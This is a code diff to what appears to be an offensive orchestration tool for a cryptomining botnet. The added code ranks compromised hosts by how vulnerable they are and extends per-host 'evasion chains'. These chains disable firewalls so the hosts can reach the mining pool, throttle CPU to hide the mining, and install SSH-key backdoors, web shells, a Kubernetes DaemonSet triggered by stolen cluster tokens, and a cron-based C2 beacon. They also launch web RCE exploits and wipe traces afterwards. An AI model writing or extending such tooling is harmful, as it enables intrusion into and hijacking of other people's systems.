@@ -589,6 +589,31 @@ class ChainOrchestrator:
             self._emit(ChainPhase.ENUMERATE,
                         f"bandit reordered {len(self.state.hosts)} host(s)")
 
+            # Blend bandit score with priority_score (50/50). Hosts with
+            # high vulnerability scores (weak SSH, old software, CVE-prone
+            # packages) are prioritized alongside historically successful
+            # banners.
+            conn_prio = store._connect()
+            try:
+                prio_rows = conn_prio.execute(
+                    "SELECT ip, port, priority_score FROM hosts "
+                    "WHERE priority_score > 0"
+                ).fetchall()
+                priority_map = {(r[0], r[1]): r[2] for r in prio_rows}
+            finally:
+                store._close(conn_prio)
+            if priority_map:
+                max_prio = max(priority_map.values()) or 1.0
+
+                def blend_key(h: tuple) -> float:
+                    ucb1 = scores.get(banner_map.get(h, ""), 0.0)
+                    prio = priority_map.get(h, 0.0)
+                    return ucb1 * 0.5 + (prio / max_prio) * 0.5
+
+                self.state.hosts.sort(key=lambda h: -blend_key(h))
+                self._emit(ChainPhase.ENUMERATE,
+                            f"blended bandit+priority for {len(priority_map)} host(s)")
+
         self._emit(ChainPhase.ENUMERATE, f"{len(self.state.hosts)} real/likely hosts")
 
         from honeywatch.opsec import auth_methods
@@ -1256,7 +1281,9 @@ class ChainOrchestrator:
 
         total_enqueued = 0
         for profile, footholds_in_group in groups.items():
-            evasion = self._evasion_chain_for_profile(profile)
+            # Use the first foothold's IP for k8s/web detection.
+            first_ip = footholds_in_group[0][0] if footholds_in_group else ""
+            evasion = self._evasion_chain_for_profile(profile, ip=first_ip)
             targets: list[Target] = []
             for ip, port, user, pw in footholds_in_group:
                 targets.append(Target(
@@ -1349,7 +1376,23 @@ class ChainOrchestrator:
             parts.append("web")
         return "_".join(parts)
 
-    def _evasion_chain_for_profile(self, profile: str) -> list[str]:
+    def _has_k8s_token(self, ip: str) -> bool:
+        """Check if any loot for this host contains k8s credentials."""
+        for l in self.state.loot:
+            if l.get("ip") != ip:
+                continue
+            files = l.get("files", {})
+            if isinstance(files, dict):
+                for desc in files.values():
+                    if "k8s" in str(desc).lower() or "kube" in str(desc).lower():
+                        return True
+            metadata = l.get("metadata", {})
+            if isinstance(metadata, dict):
+                if metadata.get("k8s_sa_token") or metadata.get("kube_config"):
+                    return True
+        return False
+
+    def _evasion_chain_for_profile(self, profile: str, ip: str = "", port: int = 0) -> list[str]:
         """Build the evasion chain for a persistence profile.
 
         Every chain starts with kill_miners and ends with cleanup. The
@@ -1359,6 +1402,10 @@ class ChainOrchestrator:
         # Add operator-configured evasion first.
         if self.cfg.evasion:
             chain.extend(self.cfg.evasion)
+
+        # firewall_disable ensures pool connectivity (prepend position).
+        if "firewall_disable" not in chain:
+            chain.append("firewall_disable")
 
         if profile == "windows":
             # Windows: no systemd/cron. Use scheduled task + SSH backdoor.
@@ -1386,6 +1433,9 @@ class ChainOrchestrator:
                 chain.append("web_shell_persist")
             if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                 chain.append("sshkey_backdoor")
+            # Root hosts: throttle CPU to reduce thermal footprint.
+            if "cpu_governor" not in chain:
+                chain.append("cpu_governor")
         else:
             # Normal Linux (non-root): systemd + cron + SSH backdoor.
             if "systemd_persist" not in chain:
@@ -1396,6 +1446,18 @@ class ChainOrchestrator:
                 chain.append("web_shell_persist")
             if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                 chain.append("sshkey_backdoor")
+
+        # K8s token detected: deploy DaemonSet for cluster-wide persistence.
+        if ip and self._has_k8s_token(ip) and "k8s_daemonset" not in chain:
+            chain.append("k8s_daemonset")
+
+        # C2 beacon as persistence fallback (cron-based callback).
+        if "cron_beacon" not in chain:
+            chain.append("cron_beacon")
+
+        # Web services detected: attempt known web RCE exploits.
+        if "web" in profile and "web_exploit" not in chain:
+            chain.append("web_exploit")
 
         # cleanup runs LAST — wipes traces after persistence is installed.
         if "cleanup" not in chain:
